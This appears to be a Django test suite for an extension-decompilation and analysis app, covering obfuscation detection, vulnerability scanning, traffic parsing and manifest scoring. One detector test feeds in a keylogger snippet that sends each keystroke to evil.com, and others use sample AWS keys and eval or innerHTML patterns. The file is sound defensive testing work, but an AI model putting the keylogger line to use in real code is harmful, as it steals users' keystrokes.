"""
Tests for the Decompiler app.
"""
import os
import io
import json
import tempfile
from django.test import TestCase, Client
from django.contrib.auth.models import User
from django.urls import reverse
import uuid

from .models import (
    ExtensionPackage,
    DecompilationJob,
    ObfuscationTechnique,
    DetectedObfuscation,
    ExtensionAnalysis,
    TrafficInterception,
)
from .engine import (
    DecompilationEngine,
    ObfuscationDetector,
    CodeAnalyzer,
    TrafficAnalyzer,
    RecompilationEngine,
)
from .utils.crypto_utils import calculate_entropy, find_base64_strings
from .utils.file_utils import detect_type_from_magic, calculate_checksums
from .utils.js_utils import (
    beautify_js, is_minified, detect_module_system, parse_userscript_metadata
)
from .utils.manifest_parser import (
    parse_chrome_manifest, score_permission, analyze_csp
)


# ---------------------------------------------------------------------------
# Model tests
# ---------------------------------------------------------------------------

class ExtensionPackageModelTest(TestCase):
    def setUp(self):
        self.user = User.objects.create_user(username="testuser", password="testpass")

    def test_extension_package_creation(self):
        pkg = ExtensionPackage.objects.create(
            name="TestExt",
            extension_type="chrome_crx",
            download_url="http://example.com/ext.crx",
            downloaded_by=self.user,
            file_size=1024,
        )
        self.assertEqual(str(pkg), "TestExt (chrome_crx)")
        self.assertIsInstance(pkg.package_id, uuid.UUID)

    def test_extension_type_choices(self):
        valid_types = [t[0] for t in ExtensionPackage.EXTENSION_TYPES]
        self.assertIn("chrome_crx", valid_types)
        self.assertIn("firefox_xpi", valid_types)
        self.assertIn("wasm", valid_types)
        self.assertIn("electron_asar", valid_types)
        self.assertIn("userscript", valid_types)
        self.assertIn("java_applet", valid_types)
        self.assertIn("flash", valid_types)
        self.assertIn("silverlight", valid_types)

    def test_extension_package_default_status(self):
        pkg = ExtensionPackage.objects.create(
            name="Test",
            extension_type="unknown",
            download_url="http://example.com/x",
            downloaded_by=self.user,
            file_size=0,
        )
        self.assertEqual(pkg.status, "downloaded")


class DecompilationJobModelTest(TestCase):
    def setUp(self):
        self.user = User.objects.create_user(username="testuser", password="testpass")
        self.pkg = ExtensionPackage.objects.create(
            name="TestExt",
            extension_type="javascript",
            download_url="http://example.com/ext.js",
            downloaded_by=self.user,
            file_size=512,
        )

    def test_decompilation_job_creation(self):
        job = DecompilationJob.objects.create(
            extension_package=self.pkg,
            decompiler_tool="builtin",
            created_by=self.user,
        )
        self.assertEqual(job.status, "queued")
        self.assertIsInstance(job.job_id, uuid.UUID)

    def test_job_status_transitions(self):
        job = DecompilationJob.objects.create(
            extension_package=self.pkg,
            decompiler_tool="builtin",
        )
        job.status = "completed"
        job.save()
        refreshed = DecompilationJob.objects.get(job_id=job.job_id)
        self.assertEqual(refreshed.status, "completed")


class ObfuscationTechniqueModelTest(TestCase):
    def test_obfuscation_technique_creation(self):
        tech = ObfuscationTechnique.objects.create(
            name="Test Technique",
            obfuscation_type="name_mangling",
            description="Short variable names",
            severity=7,
        )
        self.assertEqual(str(tech), "Test Technique (name_mangling)")


class ExtensionAnalysisModelTest(TestCase):
    def setUp(self):
        self.user = User.objects.create_user(username="testuser", password="testpass")
        self.pkg = ExtensionPackage.objects.create(
            name="TestExt",
            extension_type="javascript",
            download_url="http://example.com/x",
            downloaded_by=self.user,
            file_size=0,
        )
        self.job = DecompilationJob.objects.create(
            extension_package=self.pkg,
            decompiler_tool="builtin",
        )

    def test_analysis_creation(self):
        analysis = ExtensionAnalysis.objects.create(
            decompilation_job=self.job,
            risk_level="low",
        )
        self.assertIsNotNone(analysis.analysis_id)
        self.assertEqual(str(analysis), f"Analysis of TestExt")


class TrafficInterceptionModelTest(TestCase):
    def test_traffic_interception_creation(self):
        ti = TrafficInterception.objects.create(
            protocol="http",
            request_url="http://example.com/api/test",
            request_method="POST",
        )
        self.assertIsNotNone(ti.interception_id)
        self.assertIn("HTTP", str(ti))


# ---------------------------------------------------------------------------
# View tests
# ---------------------------------------------------------------------------

class DecompilerViewsTest(TestCase):
    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(username="testuser", password="testpass")
        self.client.login(username="testuser", password="testpass")

    def test_decompiler_home_view(self):
        response = self.client.get(reverse("decompiler:home"))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Decompiler")

    def test_list_packages_empty(self):
        response = self.client.get(reverse("decompiler:list_packages"))
        self.assertEqual(response.status_code, 200)
        data = json.loads(response.content)
        self.assertIn("packages", data)
        self.assertEqual(data["packages"], [])

    def test_list_packages_requires_auth(self):
        self.client.logout()
        response = self.client.get(reverse("decompiler:list_packages"))
        self.assertIn(response.status_code, [302, 403])

    def test_upload_extension_package_no_file(self):
        response = self.client.post(reverse("decompiler:upload_package"), {})
        self.assertEqual(response.status_code, 400)

    def test_start_decompilation_job_missing_package(self):
        response = self.client.post(
            reverse("decompiler:start_job"),
            data=json.dumps({"package_id": str(uuid.uuid4())}),
            content_type="application/json",
        )
        self.assertEqual(response.status_code, 404)

    def test_list_obfuscation_techniques(self):
        ObfuscationTechnique.objects.create(
            name="Name Mangling",
            obfuscation_type="name_mangling",
            description="Test",
        )
        response = self.client.get(reverse("decompiler:list_techniques"))
        self.assertEqual(response.status_code, 200)
        data = json.loads(response.content)
        self.assertIn("techniques", data)
        self.assertEqual(len(data["techniques"]), 1)

    def test_list_traffic_empty(self):
        response = self.client.get(reverse("decompiler:list_traffic"))
        self.assertEqual(response.status_code, 200)
        data = json.loads(response.content)
        self.assertIn("traffic", data)

    def test_capture_traffic_missing_url(self):
        response = self.client.post(
            reverse("decompiler:capture_traffic"),
            data=json.dumps({}),
            content_type="application/json",
        )
        self.assertEqual(response.status_code, 400)

    def test_capture_traffic_success(self):
        response = self.client.post(
            reverse("decompiler:capture_traffic"),
            data=json.dumps({
                "request_url": "http://example.com/api",
                "protocol": "http",
                "request_method": "GET",
            }),
            content_type="application/json",
        )
        self.assertEqual(response.status_code, 201)
        data = json.loads(response.content)
        self.assertIn("interception_id", data)


# ---------------------------------------------------------------------------
# Engine tests
# ---------------------------------------------------------------------------

class DecompilationEngineTest(TestCase):
    def setUp(self):
        self.engine = DecompilationEngine()

    def test_supported_types(self):
        self.assertIn("chrome_crx", self.engine.supported_types)
        self.assertIn("wasm", self.engine.supported_types)
        self.assertIn("userscript", self.engine.supported_types)

    def test_detect_extension_type_by_extension(self):
        self.assertEqual(self.engine.detect_extension_type("test.jar"), "java_applet")
        self.assertEqual(self.engine.detect_extension_type("test.swf"), "flash")
        self.assertEqual(self.engine.detect_extension_type("test.xap"), "silverlight")
        self.assertEqual(self.engine.detect_extension_type("test.crx"), "chrome_crx")
        self.assertEqual(self.engine.detect_extension_type("test.xpi"), "firefox_xpi")
        self.assertEqual(self.engine.detect_extension_type("test.wasm"), "wasm")
        self.assertEqual(self.engine.detect_extension_type("test.asar"), "electron_asar")

    def test_detect_extension_type_magic_bytes_swf(self):
        with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as f:
            f.write(b"FWS" + b"\x0a" + b"\x00" * 8)
            tmp_path = f.name
        try:
            result = self.engine.detect_extension_type(tmp_path)
            self.assertEqual(result, "flash")
        finally:
            os.unlink(tmp_path)

    def test_detect_extension_type_magic_bytes_java_class(self):
        with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as f:
            f.write(b"\xca\xfe\xba\xbe" + b"\x00" * 8)
            tmp_path = f.name
        try:
            result = self.engine.detect_extension_type(tmp_path)
            self.assertEqual(result, "java_applet")
        finally:
            os.unlink(tmp_path)

    def test_detect_extension_type_magic_bytes_wasm(self):
        with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as f:
            f.write(b"\x00asm" + b"\x01\x00\x00\x00")
            tmp_path = f.name
        try:
            result = self.engine.detect_extension_type(tmp_path)
            self.assertEqual(result, "wasm")
        finally:
            os.unlink(tmp_path)

    def test_decompile_unsupported_type(self):
        result = self.engine.decompile("/nonexistent/path.xyz", "/tmp", "unknown_format")
        self.assertFalse(result["success"])
        self.assertIn("error", result)

    def test_decompile_userscript(self):
        script = """// ==UserScript==
// @name My Script
// @version 1.0
// @match https://example.com/*
// @grant none
// ==/UserScript==
var x = 1;"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".user.js", delete=False) as f:
            f.write(script)
            tmp_path = f.name
        with tempfile.TemporaryDirectory() as out_dir:
            try:
                result = self.engine.decompile_userscript(tmp_path, out_dir)
                self.assertTrue(result["success"])
                self.assertEqual(result["metadata"].get("name"), "My Script")
                self.assertEqual(result["metadata"].get("version"), "1.0")
                self.assertIn("https://example.com/*", result["match_patterns"])
            finally:
                os.unlink(tmp_path)

    def test_decompile_javascript(self):
        script = "var x=1;var y=2;function add(a,b){return a+b;}"
        with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
            f.write(script)
            tmp_path = f.name
        with tempfile.TemporaryDirectory() as out_dir:
            try:
                result = self.engine._decompile_javascript(tmp_path, out_dir)
                self.assertTrue(result["success"])
                self.assertIn("module_system", result)
            finally:
                os.unlink(tmp_path)

    def test_parse_swf_header_valid(self):
        with tempfile.NamedTemporaryFile(suffix=".swf", delete=False) as f:
            import struct
            f.write(b"FWS")
            f.write(struct.pack("B", 15))
            f.write(struct.pack("<I", 100))
            tmp_path = f.name
        try:
            info = self.engine._parse_swf_header(tmp_path)
            self.assertTrue(info["valid"])
            self.assertEqual(info["version"], 15)
            self.assertEqual(info["compression"], "none")
        finally:
            os.unlink(tmp_path)

    def test_parse_swf_header_invalid(self):
        with tempfile.NamedTemporaryFile(suffix=".swf", delete=False) as f:
            f.write(b"NOTSWF")
            tmp_path = f.name
        try:
            info = self.engine._parse_swf_header(tmp_path)
            self.assertFalse(info["valid"])
        finally:
            os.unlink(tmp_path)


# ---------------------------------------------------------------------------
# ObfuscationDetector tests
# ---------------------------------------------------------------------------

class ObfuscationDetectorTest(TestCase):
    def setUp(self):
        self.detector = ObfuscationDetector()

    def test_detect_name_mangling_not_obfuscated(self):
        code = """
        function calculateTotalPrice(itemPrice, quantity, discount) {
            var totalBeforeDiscount = itemPrice * quantity;
            var discountAmount = totalBeforeDiscount * discount;
            return totalBeforeDiscount - discountAmount;
        }
        """
        detected, confidence, evidence = self.detector.detect_name_mangling(code)
        self.assertFalse(detected)

    def test_detect_name_mangling_obfuscated(self):
        # Heavily mangled code — all single-letter vars (no keyword like 'var')
        # Use assignment expressions so 'var' keyword doesn't dilute the ratio
        vars_code = ";".join([f"{c}={i}" for i, c in enumerate("abcdefghijklmnopqrstuvwxy")])
        code = vars_code + ";" * 5  # a=0;b=1;c=2;... 
        detected, confidence, evidence = self.detector.detect_name_mangling(code)
        self.assertTrue(detected)
        self.assertGreater(confidence, 0.4)

    def test_detect_string_encryption_clean(self):
        code = 'var greeting = "Hello World"; var name = "user";'
        detected, confidence, _ = self.detector.detect_string_encryption(code)
        self.assertFalse(detected)

    def test_detect_string_encryption_with_base64(self):
        import base64
        secret = base64.b64encode(b"sensitive_data_here_12345").decode()
        code = f'var x = atob("{secret}");'
        detected, confidence, evidence = self.detector.detect_string_encryption(code)
        self.assertTrue(detected)
        self.assertIn("atob", evidence)

    def test_detect_control_flow_dean_edwards(self):
        code = "eval(function(p,a,c,k,e,d){return 'packed'})"
        detected, confidence, evidence = self.detector.detect_control_flow_obfuscation(code)
        self.assertTrue(detected)
        self.assertIn("Dean Edwards", evidence)

    def test_calculate_entropy(self):
        # Low entropy — repeated chars
        low_e = self.detector.calculate_entropy("aaaaaaaaaa")
        # High entropy — random-looking
        high_e = self.detector.calculate_entropy("x9Kp2mQzR7nA3yBv")
        self.assertLess(low_e, high_e)

    def test_generate_obfuscation_report_structure(self):
        code = "var x = 1;"
        report = self.detector.generate_obfuscation_report(code)
        self.assertIn("overall_obfuscation_score", report)
        self.assertIn("techniques_detected", report)
        self.assertIn("findings", report)
        self.assertIsInstance(report["findings"], list)

    def test_detect_all_returns_list(self):
        results = self.detector.detect_all("function foo() { return 1; }")
        self.assertIsInstance(results, list)


# ---------------------------------------------------------------------------
# CodeAnalyzer tests
# ---------------------------------------------------------------------------

class CodeAnalyzerTest(TestCase):
    def setUp(self):
        self.analyzer = CodeAnalyzer()

    def test_extract_api_endpoints_http(self):
        code = '''
        fetch("https://api.example.com/v1/users");
        var base = "https://backend.example.com/api";
        '''
        endpoints = self.analyzer.extract_api_endpoints(code)
        urls = [e["url"] for e in endpoints]
        self.assertIn("https://api.example.com/v1/users", urls)

    def test_extract_api_endpoints_websocket(self):
        code = 'var ws = new WebSocket("wss://stream.example.com/live");'
        endpoints = self.analyzer.extract_api_endpoints(code)
        ws_urls = [e for e in endpoints if e["type"] == "websocket"]
        self.assertTrue(len(ws_urls) > 0)

    def test_find_vulnerabilities_eval(self):
        code = 'eval(userInput + "code")'
        vulns = self.analyzer.find_vulnerabilities(code)
        types = [v["type"] for v in vulns]
        self.assertIn("eval_with_input", types)

    def test_find_vulnerabilities_inner_html(self):
        code = 'document.getElementById("div").innerHTML = userContent;'
        vulns = self.analyzer.find_vulnerabilities(code)
        types = [v["type"] for v in vulns]
        self.assertIn("inner_html", types)

    def test_find_vulnerabilities_insecure_http(self):
        code = 'fetch("http://api.external.com/data")'
        vulns = self.analyzer.find_vulnerabilities(code)
        types = [v["type"] for v in vulns]
        self.assertIn("insecure_http", types)

    def test_extract_network_requests_fetch(self):
        code = 'fetch("https://api.example.com/data", {method: "POST"})'
        reqs = self.analyzer.extract_network_requests(code)
        self.assertTrue(len(reqs) > 0)
        self.assertEqual(reqs[0]["library"], "fetch")
        self.assertIn("api.example.com", reqs[0]["url"])

    def test_analyze_data_flows(self):
        code = 'localStorage.setItem("token", value); document.cookie = "key=val";'
        flows = self.analyzer.analyze_data_flows(code)
        flow_types = [f["type"] for f in flows]
        self.assertIn("local_storage", flow_types)
        self.assertIn("cookies_read", flow_types)

    def test_analyze_permissions(self):
        permissions = ["tabs", "storage", "<all_urls>"]
        scored = self.analyzer.analyze_permissions(permissions)
        self.assertEqual(len(scored), 3)
        # <all_urls> should be highest risk
        self.assertEqual(scored[0]["permission"], "<all_urls>")
        self.assertEqual(scored[0]["risk_level"], "critical")

    def test_detect_malicious_keylogger(self):
        code = 'document.addEventListener("keydown", function(e) { fetch("http://evil.com?k="+e.key); });'
        malicious = self.analyzer.detect_malicious_patterns(code)
        types = [m["type"] for m in malicious]
        self.assertIn("keylogger", types)

    def test_extract_secrets_aws_key(self):
        code = 'var key = "AKIAIOSFODNN7EXAMPLE"; // AWS access key'
        secrets = self.analyzer.extract_secrets(code)
        types = [s["type"] for s in secrets]
        self.assertIn("aws_access_key", types)

    def test_generate_dependency_graph(self):
        code = 'const fs = require("fs"); import path from "path";'
        graph = self.analyzer.generate_dependency_graph(code)
        self.assertIn("imports", graph)
        self.assertIn("fs", graph["imports"])

    def test_find_javascript_hooks(self):
        code = 'window.addEventListener("message", handler); new MutationObserver(cb);'
        hooks = self.analyzer.find_javascript_hooks(code)
        types = [h["type"] for h in hooks]
        self.assertIn("event_listeners", types)


# ---------------------------------------------------------------------------
# TrafficAnalyzer tests
# ---------------------------------------------------------------------------

class TrafficAnalyzerTest(TestCase):
    def setUp(self):
        self.analyzer = TrafficAnalyzer()

    def test_identify_protocol_http(self):
        data = b"HTTP/1.1 200 OK\r\n"
        self.assertEqual(self.analyzer.identify_protocol(data), "http")

    def test_identify_protocol_json(self):
        data = b'{"key": "value"}'
        self.assertEqual(self.analyzer.identify_protocol(data), "json")

    def test_identify_protocol_xml(self):
        data = b"<?xml version=\'1.0\'?><root/>"
        self.assertEqual(self.analyzer.identify_protocol(data), "xml")

    def test_identify_protocol_java_serialization(self):
        data = b"\xac\xed\x00\x05" + b"\x00" * 10
        self.assertEqual(self.analyzer.identify_protocol(data), "java_serialization")

    def test_identify_protocol_empty(self):
        self.assertEqual(self.analyzer.identify_protocol(b""), "empty")

    def test_parse_java_serialization_valid(self):
        data = b"\xac\xed\x00\x05" + b"\x00" * 20
        result = self.analyzer.parse_java_serialization(data)
        self.assertTrue(result.get("success"))
        self.assertEqual(result["magic"], "ACED 0005")

    def test_parse_java_serialization_invalid(self):
        result = self.analyzer.parse_java_serialization(b"INVALID")
        self.assertIn("error", result)

    def test_parse_amf_too_short(self):
        result = self.analyzer.parse_amf(b"\x00")
        self.assertIn("error", result)

    def test_parse_websocket_frames_text(self):
        import struct
        # Unmasked text frame: fin=1, opcode=1, payload="Hi"
        payload = b"Hi"
        frame = bytes([0x81, len(payload)]) + payload
        frames = self.analyzer.parse_websocket_frames(frame)
        self.assertEqual(len(frames), 1)
        self.assertEqual(frames[0]["opcode"], "text")
        self.assertEqual(frames[0]["text"], "Hi")

    def test_extract_credentials_aws_key(self):
        data = b"Authorization: AKIA1234567890ABCDEF some request"
        creds = self.analyzer.extract_credentials(data)
        # AWS key or bearer found
        self.assertIsInstance(creds, list)


# ---------------------------------------------------------------------------
# Utility tests
# ---------------------------------------------------------------------------

class CryptoUtilsTest(TestCase):
    def test_entropy_zero_for_constant(self):
        self.assertAlmostEqual(calculate_entropy("aaaa"), 0.0)

    def test_entropy_high_for_random(self):
        entropy = calculate_entropy("aAbBcCdDeEfFgGhH")
        self.assertGreater(entropy, 3.0)

    def test_find_base64_strings(self):
        import base64
        encoded = base64.b64encode(b"hello world this is a test").decode()
        code = f'var x = "{encoded}";'
        results = find_base64_strings(code)
        self.assertIn(encoded, results)


class FileUtilsTest(TestCase):
    def test_calculate_checksums(self):
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b"test data for checksum")
            tmp_path = f.name
        try:
            checksums = calculate_checksums(tmp_path)
            self.assertIn("md5", checksums)
            self.assertIn("sha256", checksums)
            self.assertEqual(len(checksums["md5"]), 32)
            self.assertEqual(len(checksums["sha256"]), 64)
        finally:
            os.unlink(tmp_path)

    def test_detect_type_wasm(self):
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b"\x00asm\x01\x00\x00\x00")
            tmp_path = f.name
        try:
            result = detect_type_from_magic(tmp_path)
            self.assertEqual(result, "wasm")
        finally:
            os.unlink(tmp_path)

    def test_detect_type_java_class(self):
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b"\xca\xfe\xba\xbe\x00\x00\x00\x3e")
            tmp_path = f.name
        try:
            result = detect_type_from_magic(tmp_path)
            self.assertEqual(result, "java_applet")
        finally:
            os.unlink(tmp_path)


class JsUtilsTest(TestCase):
    def test_beautify_js(self):
        minified = "function add(a,b){return a+b;}"
        beautified = beautify_js(minified)
        self.assertIn("\n", beautified)

    def test_is_minified_true(self):
        long_line = "var " + "x=1;" * 200
        self.assertTrue(is_minified(long_line))

    def test_is_minified_false(self):
        readable = "function hello() {\n    return 42;\n}"
        self.assertFalse(is_minified(readable))

    def test_detect_module_system_commonjs(self):
        code = 'const x = require("./module"); module.exports = x;'
        self.assertEqual(detect_module_system(code), "commonjs")

    def test_detect_module_system_esmodule(self):
        code = 'import { foo } from "./bar"; export default foo;'
        self.assertEqual(detect_module_system(code), "esmodule")

    def test_parse_userscript_metadata(self):
        script = """// ==UserScript==
// @name        My Script
// @version     2.0
// @match       https://example.com/*
// @grant       GM_xmlhttpRequest
// ==/UserScript==
console.log("hello");"""
        meta = parse_userscript_metadata(script)
        self.assertEqual(meta["name"], "My Script")
        self.assertEqual(meta["version"], "2.0")
        self.assertIn("https://example.com/*", meta.get("match", ""))


class ManifestParserTest(TestCase):
    def test_parse_chrome_manifest_v3(self):
        manifest = json.dumps({
            "manifest_version": 3,
            "name": "My Extension",
            "version": "1.0",
            "permissions": ["tabs", "storage"],
            "host_permissions": ["https://example.com/*"],
        })
        result = parse_chrome_manifest(manifest)
        self.assertEqual(result["manifest_version"], 3)
        self.assertEqual(result["name"], "My Extension")
        self.assertIn("tabs", result["permissions"])
        self.assertIn("https://example.com/*", result["permissions"])

    def test_score_permission_all_urls(self):
        score, level = score_permission("<all_urls>")
        self.assertGreaterEqual(score, 80)
        self.assertIn(level, ("critical", "high"))

    def test_score_permission_storage(self):
        score, level = score_permission("storage")
        self.assertLess(score, 50)

    def test_analyze_csp_unsafe_eval(self):
        csp = "script-src \'self\' \'unsafe-eval\';"
        issues = analyze_csp(csp)
        self.assertTrue(any("unsafe-eval" in i for i in issues))

    def test_parse_chrome_manifest_invalid_json(self):
        result = parse_chrome_manifest("not valid json {{{")
        self.assertIn("error", result)
